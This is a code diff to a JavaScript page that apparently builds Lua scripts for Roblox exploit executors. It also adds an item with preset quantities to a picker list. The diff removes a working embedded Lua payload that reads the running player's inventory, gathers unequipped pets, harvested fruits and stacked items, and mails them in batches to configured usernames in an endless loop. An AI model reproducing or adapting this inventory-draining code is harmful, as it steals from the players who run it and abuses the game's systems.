@@ -218,113 +218,7 @@ ${itemsBlock}},
     MAIL_NOTE = "Enjoy and have a great day!",
     SEND_INTERVAL = 9999999999999 ,
     AUTO_SEND = true,
-}
-local C = getgenv().MailboxConfig or {}
-local RS = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local Net = require(RS:WaitForChild("SharedModules"):WaitForChild("Networking"))
-local PS = require(RS:WaitForChild("ClientModules"):WaitForChild("PlayerStateClient"))
-local STACK = {Sprinklers=1,WateringCans=1,Mushrooms=1,Gnomes=1,Raccoons=1,Crates=1,SeedPacks=1,Trowels=1,Props=1,Seeds=1,HarvestedFruits=1,Flashbangs=1,EmptyPots=1}
-local function getInv()
-local ok, r = pcall(function() return PS:WaitForLocalReplica(5) end)
-return ok and r and r.Data and type(r.Data.Inventory) == "table" and r.Data.Inventory
-end
-local function collectFruits(name, count)
-local lp = Players.LocalPlayer
-local ids = {}
-local function scan(container)
-if not container then return end
-for _, c in ipairs(container:GetChildren()) do
-if #ids >= count then return end
-if c:GetAttribute("FruitProxy") == true or c:GetAttribute("HarvestedFruit") == true then
-local fname = c:GetAttribute("Fruit") or c:GetAttribute("FruitName")
-local id = c:GetAttribute("Id")
-if fname == name and id then ids[#ids + 1] = id end
-end
-end
-end
-scan(lp.Backpack)
-scan(lp.Character)
-return ids
-end
-local function buildBatch(inv, items)
-local out, max = {}, 20
-local summary = {}
-local function tally(nm, n) if n > 0 then summary[nm] = (summary[nm] or 0) + n end end
-for name, amt in items do
-if #out >= max then break end
-local want = math.max(1, math.floor(tonumber(amt) or 1))
-local fruitName = type(name) == "string" and name:match("^FRUIT::(.+)$")
-if fruitName then
-local added = 0
-for _, id in ipairs(collectFruits(fruitName, want)) do
-if #out >= max then break end
-out[#out + 1] = { Category = "HarvestedFruits", ItemKey = id, Count = 1 }
-added += 1
-end
-tally(fruitName, added)
-else
-local matched = 0
-if type(inv.Pets) == "table" then
-for key, p in inv.Pets do
-if want <= 0 or #out >= max then break end
-if type(p) == "table" and p.Id and not p.Equipped and (tostring(p.Name):gsub("%s",""):lower()) == (tostring(name):gsub("%s",""):lower()) then
-out[#out + 1] = { Category = "Pets", ItemKey = key, Count = 1 }
-want -= 1
-matched += 1
-end
-end
-end
-if matched > 0 then tally(name, matched) end
-if want > 0 then
-for cat in STACK do
-local t = inv[cat]
-if type(t) == "table" and type(t[name]) == "number" and t[name] > 0 then
-local c = math.min(want, t[name])
-out[#out + 1] = { Category = cat, ItemKey = name, Count = c }
-tally(name, c)
-break
-end
-end
-end
-end
-end
-return out, summary
-end
-getgenv().mailboxSendOnce = function()
-local function result(s) pcall(function() writefile("send_result.txt", s) end) end
-local users, items = C.MAIL_USERNAME or {}, C.MAIL_ITEM_NAME or {}
-if #users == 0 or not next(items) then result("FAIL|Empty config - nothing sent.") return warn("[Mailbox] empty config") end
-local inv = getInv()
-if not inv then result("FAIL|Could not read inventory.") return warn("[Mailbox] no inventory") end
-local batch, summary = buildBatch(inv, items)
-if #batch == 0 then result("FAIL|Nothing matched to send.") return warn("[Mailbox] nothing to send") end
-local target = tostring(users[math.random(#users)])
-local ok, uid, err = pcall(function() return Net.Mailbox.LookupPlayer:Fire(target) end)
-if not ok or type(uid) ~= "number" or uid <= 0 then result("FAIL|Could not find @" .. target .. ".") return warn("[Mailbox] lookup:", err) end
-local sok, success, msg = pcall(function() return Net.Mailbox.SendBatch:Fire(uid, batch, C.MAIL_NOTE or "") end)
-if sok and success then
-local lines = {}
-for disp, cnt in pairs(summary) do
-lines[#lines + 1] = ("SENT|@%s sent %s %d Confirmed"):format(target, tostring(disp), cnt)
-end
-result(table.concat(lines, "\n"))
-else
-result("FAIL|@" .. target .. " send may have failed.")
-end
-print(success and "[Mailbox] sent to " .. target or "[Mailbox] fail:", msg or success)
-return success and true or false
-end
-if C.AUTO_SEND ~= false then
-task.spawn(function()
-while true do
-pcall(getgenv().mailboxSendOnce)
-task.wait(tonumber(C.SEND_INTERVAL) or 10)
-end
-end)
-else
-getgenv().mailboxSendOnce()
-end`;
+}`;
 
 const esc = s => s.replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
 
@@ -353,6 +247,7 @@ const ITEMS = [
   {label:'Rainbow Seed',        code:'Rainbow'},
   {label:'Raccoon',             code:'Raccoon', max:20},
   {label:'Robin',               code:'Robin', max:20},
+  {label:'Sheckles (M)',        code:'SHECKLES', qtyOptions:[1,5,20,25,50,100,250,500,750,1000]},
   {label:'Sunflower Seed',      code:'Sunflower', max:20},
   {label:'Super Sprinkler',     code:'Super Sprinkler', max:20},
   {label:'Super Watering Can',  code:'Super Watering Can', max:20},
@@ -392,8 +287,13 @@ function applyQtyConstraints(o){
   const it = ITEMS.find(x => x.label.toLowerCase() === o.itemInput.value.trim().toLowerCase());
   const min = it && it.min ? it.min : 1;
   const max = it && it.max ? it.max : Infinity;
-  let vals = QTY_OPTIONS.filter(v => { const n = +v; return n >= min && n <= max; });
-  if(vals.length === 0) vals = [String(it && it.min ? it.min : 1)];
+  let vals;
+  if(it && it.qtyOptions){
+    vals = it.qtyOptions.map(String);          // fixed preset list (e.g. Sheckles)
+  } else {
+    vals = QTY_OPTIONS.filter(v => { const n = +v; return n >= min && n <= max; });
+    if(vals.length === 0) vals = [String(it && it.min ? it.min : 1)];
+  }
   const cur = o.qtySel.value;
   let keep;
   if(cur === 'custom') keep = 'custom';
